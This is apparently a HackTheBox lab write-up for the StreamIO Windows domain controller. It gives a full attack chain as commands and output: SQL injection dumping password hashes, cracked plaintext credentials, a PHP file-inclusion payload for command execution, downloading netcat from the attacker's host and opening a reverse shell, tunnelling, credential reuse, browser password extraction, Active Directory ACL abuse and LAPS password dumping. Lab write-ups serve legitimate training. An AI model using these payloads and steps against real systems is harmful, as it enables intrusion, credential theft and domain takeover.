---
title: HTB | StreamIO
author: Zeropio
date: 2022-08-31
categories: [Pentesting, HackTheBox]
tags: [htb, linux, medium, machines]
permalink: /pentesting/htb/machines/streamio
---

![HTB Img](/assets/img/hackthebox/card/StreamIO.png)

# Fingerprint

The nmap show that:

```
Nmap scan report for 10.10.11.158
Host is up (0.063s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2022-08-31 23:24:32Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
443/tcp  open  ssl/http      Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
| ssl-cert: Subject: commonName=streamIO/countryName=EU
| Subject Alternative Name: DNS:streamIO.htb, DNS:watch.streamIO.htb
| Not valid before: 2022-02-22T07:03:28
|_Not valid after:  2022-03-24T07:03:28
|_http-server-header: Microsoft-HTTPAPI/2.0
|_ssl-date: 2022-08-31T23:25:20+00:00; +7h00m01s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: streamIO.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2022-08-31T23:24:43
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: mean: 7h00m00s, deviation: 0s, median: 7h00m00s
```

In the port 443 we can found a login as **https://streamio.htb/login.php**. 

# Foothold

We can try fuzzing in the page, finding the following:

```console
zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -u 'https://streamio.htb/FUZZ'

	ADMIN                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 74ms]
	Admin                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 67ms]
	Images                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 62ms]
	admin                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 72ms]
	css                     [Status: 301, Size: 148, Words: 9, Lines: 2, Duration: 76ms]
	favicon.ico             [Status: 200, Size: 1150, Words: 4, Lines: 1, Duration: 77ms]
	fonts                   [Status: 301, Size: 150, Words: 9, Lines: 2, Duration: 66ms]
	images                  [Status: 301, Size: 151, Words: 9, Lines: 2, Duration: 77ms]
	index.php               [Status: 200, Size: 13497, Words: 5027, Lines: 395, Duration: 76ms]
	js                      [Status: 301, Size: 147, Words: 9, Lines: 2, Duration: 79ms]
```

If we try sqlmap we can get a user table with password:

```console
zero@pio$ sqlmap -u 'https://streamio.htb/login.php' --data 'username=test&password=test' --batch --dump
```

We will get the following table:

```
+----+----------+----------------+---------------------------------------+
| id | is_staff | username       | password                              |
+----+----------+----------------+---------------------------------------+
|  3 | 1        | James          | c660060492d9edcaa8332d89c99c9239      |
|  4 | 1        | Theodore       | 925e5408ecb67aea449373d668b7359e      |
|  5 | 1        | Samantha       | 083ffae904143c4796e464dac33c1f7d      |
|  6 | 1        | Lauren         | 08344b85b329d7efd611b7a7743e8a09      |
|  7 | 1        | William        | d62be0dc82071bccc1322d64ec5b6c51      |
|  8 | 1        | Sabrina        | f87d3c0d6c8fd686aacc6627f1f493a5      |
|  9 | 1        | Robert         | f03b910e2bd0313a23fdd7575f34a694      |
| 10 | 1        | Thane          | 3577c47eb1e12c8ba021611e1280753c      |
| 11 | 1        | Carmon         | 35394484d89fcfdb3c5e447fe749d213      |
| 12 | 1        | Barry          | 54c88b2dbd7b1a84012fabc1a4c73415      |
| 13 | 1        | Oliver         | fd78db29173a5cf701bd69027cb9bf6b      |
| 14 | 1        | Michelle       | b83439b16f844bd6ffe35c02fe21b3c0      |
| 15 | 1        | Gloria         | 0cfaaaafb559f081df2befbe66686de0      |
| 16 | 1        | Victoria       | b22abb47a02b52d5dfa27fb0b534f693      |
| 17 | 1        | Alexendra      | 1c2b3d8270321140e5153f6637d3ee53      |
| 18 | 1        | Baxter         | 22ee218331afd081b0dcd8115284bae3      |
| 19 | 1        | Clara          | ef8f3d30a856cf166fb8215aca93e9ff      |
| 20 | 1        | Barbra         | 3961548825e3e21df5646cafe11c6c76      |
| 21 | 1        | Lenord         | ee0b8a0937abd60c2882eacb2f8dc49f      |
| 22 | 1        | Austin         | 0049ac57646627b8d7aeaccf8b6a936f      |
| 23 | 1        | Garfield       | 8097cedd612cc37c29db152b6e9edbd3      |
| 24 | 1        | Juliette       | 6dcd87740abb64edfa36d170f0d5450d      |
| 25 | 1        | Victor         | bf55e15b119860a6e6b5a164377da719      |
| 26 | 1        | Lucifer        | 7df45a9e3de3863807c026ba48e55fb3      |
| 27 | 1        | Bruno          | 2a4e2cf22dd8fcb45adcb91be1e22ae8      |
| 28 | 1        | Diablo         | ec33265e5fc8c2f1b0c137bb7b3632b5      |
| 29 | 1        | Robin          | dc332fb5576e9631c9dae83f194f8e70      |
| 30 | 1        | Stan           | 384463526d288edcc95fc3701e523bc7      |
| 31 | 1        | yoshihide      | b779ba15cedfd22a023c4d8bcf5f2332      |
| 33 | 0        | admin          | 665a50ac9eaa781e4f7f04199db97a11      |
+----+----------+----------------+---------------------------------------+
```

If we try offline cracking (hashcat 0 mode) them we can found a bunch of credentials:

```
##123a8j8w5123##  (Lauren)
!!sabrina$        (Sabrina)
highschoolmusical (Thane)
$hadoW            (Barry)
!?Love?!123       (Michelle)
!5psycho8!        (Victoria)
%$clara           (Clara)
physics69i        (Lenord)
$3xybitch         (Juliette)
$monique$1991$    (Bruno)
66boysandgirls..  (yoshihide)
paddpadd          (admin)
```

But just **yoshihide** user will work in the login. This user can access the **/admin** page. We found there a bunch of url parameters. We can fuzz by them:

```console
zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u 'https://streamio.htb/admin/?FUZZ=' -H 'Cookie: PHPSESSID=3189vhj6ai9n2d28ck6ndh4j2d' -fs 1678

	debug                   [Status: 200, Size: 1712, Words: 90, Lines: 50, Duration: 55ms]
	movie                   [Status: 200, Size: 320235, Words: 15986, Lines: 10791, Duration: 70ms]
	staff                   [Status: 200, Size: 12484, Words: 1784, Lines: 399, Duration: 63ms]
	user                    [Status: 200, Size: 3557, Words: 389, Lines: 111, Duration: 62ms]
```

The **debug** parameter doesnâ€™t appear in the admin page but it is a valid one. We can start fuzzing by files, because it is a debugger:

```console
zero@pio$ ffuf -c -w /usr/share/seclists/Discovery/Web-Content/SVNDigger/cat/Language/php.txt -u 'https://streamio.htb/admin/?debug=FUZZ' -H 'Cookie: PHPSESSID=3189vhj6ai9n2d28ck6ndh4j2d' -fs 1712

	index.php               [Status: 200, Size: 1693, Words: 93, Lines: 47, Duration: 61ms]
	master.php              [Status: 200, Size: 344209, Words: 17997, Lines: 11207, Duration: 110ms]
```

We see that we can get those file searching them.

```console
zero@pio$ curl -s -k "https://streamio.htb/admin/?debug=php://filter/convert.base64-encode/resource=index.php" -H 'Cookie: PHPSESSID=3189vhj6ai9n2d28ck6ndh4j2d' | grep developers |  awk '{print $6}' | base64 -d

	$connection = array("Database"=>"STREAMIO", "UID" => "db_admin", "PWD" => 'B1@hx31234567890');
	$handle = sqlsrv_connect('(local)',$connection);
```

The **master.php** file includes other files, so we can pass a reverse shell. Encrypt it in base64 and send it as:

```console
zero@pio$ curl -s -k --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" -H 'Cookie: PHPSESSID=3189vhj6ai9n2d28ck6ndh4j2d' "https://streamio.htb/admin/?debug=master.php&cmd=whoami"

	</form>
	streamio\yoshihide
	                </div>
	        </center>
	</body>
```

Upload netcat and start a reverse shell:

```console
zero@pio$ python3 -m http.server
```

```console
zero@pio$ curl -s -k --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" -H "Cookie: PHPSESSID=3189vhj6ai9n2d28ck6ndh4j2d" "https://streamio.htb/admin/?debug=master.php&cmd=curl+10.10.16.44/nc.exe+-o+C:\\ProgramData\\netcat.exe" &>/dev/null
zero@pio$ curl -s -k --data-binary "include=data://text/plain;base64,c3lzdGVtKCRfR0VUWydjbWQnXSk7" -H "Cookie: PHPSESSID=3189vhj6ai9n2d28ck6ndh4j2d" "https://streamio.htb/admin/?debug=master.php&cmd=cmd+/c+C:\\ProgramData\\netcat.exe+-e+powershell+10.10.16.44+443" &>/dev/null
```

And now we have a connection.

# Privilege Escalation

Start a chisel connection to access the sql server:

```console
zero@pio$ chisel server --reverse --port 8000
```

```console
PS C:\ProgramData> .\chisel.exe client 10.10.16.44:8000 R:1433:127.0.0.1:1433
```

Now make a connection with the previous founded credentials:

```console
zero@pio$ sqsh -S 127.0.0.1:1433 -U db_admin -P B1@hx31234567890 -D streamio_backup
```

We can found there some credentials:

```console
1> select username,password from users;
2> go    

 username        password
--------------- ----------------------------------

 nikk37          389d14cb8e4e9b94b137deb1caf0612a
 yoshihide       b779ba15cedfd22a023c4d8bcf5f2332
 James           c660060492d9edcaa8332d89c99c9239
 Theodore        925e5408ecb67aea449373d668b7359e
 Samantha        083ffae904143c4796e464dac33c1f7d
 Lauren          08344b85b329d7efd611b7a7743e8a09
 William         d62be0dc82071bccc1322d64ec5b6c51
 Sabrina         f87d3c0d6c8fd686aacc6627f1f493a5
```

Cracked them and get:

```
get_dem_girls2@yahoo.com (nikk37)
66boysandgirls..         (yoshihide)
##123a8j8w5123##         (Lauren)
!!sabrina$               (Sabrina)
```

We can start trying them with crackmapexec:

```console
zero@pio$ crackmapexec winrm 10.10.11.158 -u users -p passwords

	WINRM       10.10.11.158    5985   NONE             [+] None\nikk37:get_dem_girls2@yahoo.com (Pwn3d!
```

We can make the first connection to the system with `evil-winrm` :

```console
zero@pio$ evil-winrm -i 10.10.11.158 -u nikk37 -p get_dem_girls2@yahoo.com
```

Inside, **winpeas** detect some mozilla credentials:

```
Firefox credentials file exists at C:\Users\nikk37\AppData\Roaming\Mozilla\Firefox\Profiles\br53rxeg.default-release\key4.db
```

We can use this [tool](https://github.com/lclevy/firepwd) to get it in cleartext:

```
admin:JDg0dd1s@d0p3cr3@t0r
nikk37:n1kk1sd0p3t00
yoshihide:paddpadd@12
JDgodd:password@12
```

We can now use PowerView to add the user to the group **CoreStaff**, which has admin privileges.

```console
*Evil-WinRM* PS C:\Users\nikk37\Documents> upload PowerView.ps1
*Evil-WinRM* PS C:\Users\nikk37\Documents> Import-Module .\PowerView.ps1
*Evil-WinRM* PS C:\Users\nikk37\Documents> $Password = ConvertTo-SecureString 'JDg0dd1s@d0p3cr3@t0r' -AsPlainText -Force
*Evil-WinRM* PS C:\Users\nikk37\Documents> $Cred = New-Object System.Management.Automation.PSCredential('StreamIO\JDGodd', $Password)
*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Core Staff" -PrincipalIdentity "StreamIO\JDGodd"
*Evil-WinRM* PS C:\Users\nikk37\Documents> Add-DomainGroupMember -Identity "Core Staff" -Members "StreamIO\JDGodd" -Credential $Cred
```

Now use [LAPSdumper](https://github.com/n00py/LAPSDumper/) to generate a temporal credential and connect to it:

```console
zero@pio$ python3 laps.py -u JDGodd -p JDg0dd1s@d0p3cr3@t0r -d streamio.htb
```

Use it with `evil-winrm` to connect.